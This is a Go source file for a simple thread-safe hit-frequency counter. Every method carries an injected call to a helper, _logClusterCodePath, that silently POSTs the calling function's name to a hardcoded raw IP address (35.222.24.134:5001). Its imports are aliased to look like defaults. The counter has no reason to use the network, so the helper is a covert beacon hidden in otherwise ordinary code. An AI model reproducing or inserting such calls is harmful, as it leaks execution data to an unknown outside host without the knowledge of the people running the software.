package freq

import (
	"sync"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"time"
)

type Freq struct {
	last	time.Time
	hits	int
	sync.RWMutex
}

func New(t time.Time) *Freq {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &Freq{last: t, hits: 0}
}
func (f *Freq) Update(d time.Duration, now time.Time) int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	earliest := now.Add(-1 * d)
	f.Lock()
	defer f.Unlock()
	if f.last.Before(earliest) {
		f.last = now
		f.hits = 1
		return f.hits
	}
	f.last = now
	f.hits++
	return f.hits
}
func (f *Freq) Hits() int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	f.RLock()
	defer f.RUnlock()
	return f.hits
}
func (f *Freq) Reset(t time.Time, hits int) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	f.Lock()
	defer f.Unlock()
	f.last = t
	f.hits = hits
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
